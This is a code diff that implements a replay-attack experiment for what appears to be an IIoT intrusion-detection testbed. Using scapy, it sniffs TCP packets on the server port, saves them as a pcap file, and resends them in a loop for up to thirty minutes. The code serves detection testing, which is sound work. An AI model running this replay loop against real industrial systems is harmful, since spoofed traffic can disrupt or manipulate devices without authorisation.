@@ -6,8 +6,14 @@
 """
 
 from core.base_experiment import BaseExperiment
+import time
+from pathlib import Path
 
-
+try:
+    from scapy.all import sniff, wrpcap, sendp, send, Ether
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
 class ReplayExperiment(BaseExperiment):
     """
     Evaluates the resilience of the cyber intrusion detection system against
@@ -31,44 +37,86 @@ class ReplayExperiment(BaseExperiment):
     """
 
     def initialize(self) -> None:
-        """
-        Load experiment configuration and prepare all resources required for
-        the replay simulation.
-
-        TODO (future implementation):
-            - Read target Edge Node IP and port from self.experiment_config.
-            - Open the specified .pcap file path from self.experiment_config.
-            - Parse all TCP segments and discard empty ACK/handshake frames.
-            - Extract raw TCP payloads from valid IIoT packets only.
-            - Pre-compute the inter-arrival delta_time for each consecutive pair
-              so the replay phase can sleep exactly the right amount between sends.
-            - Validate that the PCAP contains at least one valid payload before proceeding.
-        """
+        cfg = self.config.get("replay", {})
+        self.capture_count = cfg.get("capture_count", 5)
+        self.replay_count = cfg.get("replay_count", 10)
+        self.delay_before_replay = cfg.get("delay_before_replay", 30)
+        self.replay_interval_ms = cfg.get("replay_interval_ms", 500)
+        self.target_port = self.config.get("server_port", 9000)
+        
+        self.captured_packets = []
+        if not SCAPY_AVAILABLE:
+            self.logger.error("Scapy is not available. Replay attack will fail.")
+            
         self._log_initialized()
 
     def run(self) -> None:
-        """
-        Execute the replay experiment for the configured attack_duration.
-
-        TODO (future implementation):
-            - Observe the baseline for pre_attack_duration seconds (no sending).
-            - Open a fresh TCP socket to the target Edge Node.
-            - Iterate through the pre-computed payload list, sleeping delta_time
-              between each send to replicate the original timing signature.
-            - Repeat the packet list as needed to fill the full attack_duration.
-            - On socket error, attempt reconnection up to a configurable retry limit.
-            - Observe post-attack baseline for post_attack_duration seconds.
-        """
         self._log_started()
+        
+        pre_attack = self.experiment_config.get("pre_attack_duration", 5.0)
+        self.logger.info(f"[{self.name}] Observing pre-attack baseline for {pre_attack}s...")
+        time.sleep(pre_attack)
+
+        if not SCAPY_AVAILABLE:
+            self.logger.error("Cannot run ReplayExperiment without scapy.")
+            return
+
+        self.logger.info(f"[{self.name}] Phase 1: Capturing {self.capture_count} packets on port {self.target_port}...")
+        
+        try:
+            bpf_filter = f"tcp port {self.target_port}"
+            self.captured_packets = sniff(filter=bpf_filter, count=self.capture_count, timeout=30)
+        except Exception as e:
+            self.logger.error(f"Failed to capture packets: {e}")
+            return
+            
+        if not self.captured_packets:
+            self.logger.error("No packets captured. Aborting Replay Attack.")
+            return
+
+        save_path = Path(f"captures/replay_base_{int(time.time())}.pcap")
+        save_path.parent.mkdir(parents=True, exist_ok=True)
+        try:
+            wrpcap(str(save_path), self.captured_packets)
+            self.logger.info(f"[{self.name}] Saved {len(self.captured_packets)} packets to {save_path}")
+        except Exception as e:
+            self.logger.error(f"Failed to save PCAP: {e}")
+
+        self.logger.info(f"[{self.name}] Waiting {self.delay_before_replay}s before replay...")
+        time.sleep(self.delay_before_replay)
+
+        attack_duration = self.experiment_config.get("attack_duration", 1800.0)
+        self.logger.info(f"[{self.name}] Phase 2: Replaying {len(self.captured_packets)} packets continuously for {attack_duration}s")
+        
+        interval_sec = self.replay_interval_ms / 1000.0
+        
+        end_time = time.time() + attack_duration
+        iteration = 0
+        while time.time() < end_time:
+            iteration += 1
+            for i, pkt in enumerate(self.captured_packets):
+                if pkt.haslayer(Ether):
+                    try:
+                        sendp(pkt, verbose=False)
+                        self.logger.info(f"[{self.name}] Replaying Packet #{i+1} (Iter {iteration})")
+                    except Exception as e:
+                        self.logger.error(f"Failed to send packet #{i+1} at Layer 2: {e}")
+                else:
+                    try:
+                        send(pkt, verbose=False)
+                        self.logger.info(f"[{self.name}] Replaying Packet #{i+1} (Layer 3 fallback) (Iter {iteration})")
+                    except Exception as e:
+                        self.logger.error(f"Failed to send packet #{i+1} at Layer 3: {e}")
+                
+                time.sleep(interval_sec)
+
+        post_attack = self.experiment_config.get("post_attack_duration", 5.0)
+        self.logger.info(f"[{self.name}] Observing post-attack baseline for {post_attack}s...")
+        time.sleep(post_attack)
+        
         self._log_completed()
 
     def cleanup(self) -> None:
-        """
-        Release all resources allocated during initialize().
-
-        TODO (future implementation):
-            - Close any open TCP sockets gracefully (send FIN, wait for ACK).
-            - Release file handles to the PCAP file.
-            - Clear the in-memory payload list to free RAM.
-        """
+        self.captured_packets.clear()
+        self.logger.info(f"[{self.name}] Replay Attack complete.")
         self._log_cleaned_up()
